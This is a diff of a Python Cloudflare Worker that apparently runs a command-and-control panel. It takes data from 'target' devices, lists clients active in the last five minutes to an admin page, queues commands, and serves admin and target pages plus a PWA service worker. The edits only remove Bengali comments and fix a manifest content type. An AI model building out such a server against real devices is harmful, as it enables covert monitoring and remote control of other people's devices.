@@ -18,7 +18,6 @@ class Default(WorkerEntrypoint):
             "Access-Control-Allow-Headers": "Content-Type",
         }
 
-        # ১. টার্গেট ডিভাইস থেকে ডেটা রিসিভ করা
         if path == "/api/update" and request.method == "POST":
             try:
                 data = await request.json()
@@ -54,15 +53,12 @@ class Default(WorkerEntrypoint):
             except Exception as e:
                 return Response(json.dumps({"error": str(e)}), status=400, headers={**cors_headers, "Content-Type": "application/json"})
 
-        # ২. অ্যাডমিন প্যানেলে ডিভাইস লিস্ট পাঠানো
         if path == "/api/clients" and request.method == "GET":
             now = time.time()
-            # ৩০০ সেকেন্ড (৫ মিনিট) এর বেশি পুরনো ডিভাইস রিমুভ করা
             active_clients = {k: v for k, v in clients.items() if now - v.get("lastPing", now) < 300}
             clients = active_clients
             return Response(json.dumps(clients), headers={**cors_headers, "Content-Type": "application/json"})
 
-        # ৩. কমান্ড পাঠানো
         if path == "/api/command" and request.method == "POST":
             try:
                 data = await request.json()
@@ -78,7 +74,7 @@ class Default(WorkerEntrypoint):
         if request.method == "OPTIONS":
             return Response("", headers=cors_headers)
 
-        # ৪. HTML এবং PWA ফাইল সার্ভ করা
+        # HTML এবং PWA ফাইল সার্ভ করা (মুখ্য ফাইলগুলো)
         if path in ("", "/"):
             return Response(self.read_file("admin.html"), headers={"Content-Type": "text/html; charset=utf-8"})
         
@@ -86,7 +82,7 @@ class Default(WorkerEntrypoint):
             return Response(self.read_file("target.html"), headers={"Content-Type": "text/html; charset=utf-8"})
         
         if path == "/manifest.json":
-            return Response(self.read_file("manifest.json"), headers={"Content-Type": "application/json"})
+            return Response(self.read_file("manifest.json"), headers={"Content-Type": "application/manifest+json"})
         
         if path == "/service-worker.js":
             return Response(self.read_file("service-worker.js"), headers={"Content-Type": "application/javascript"})
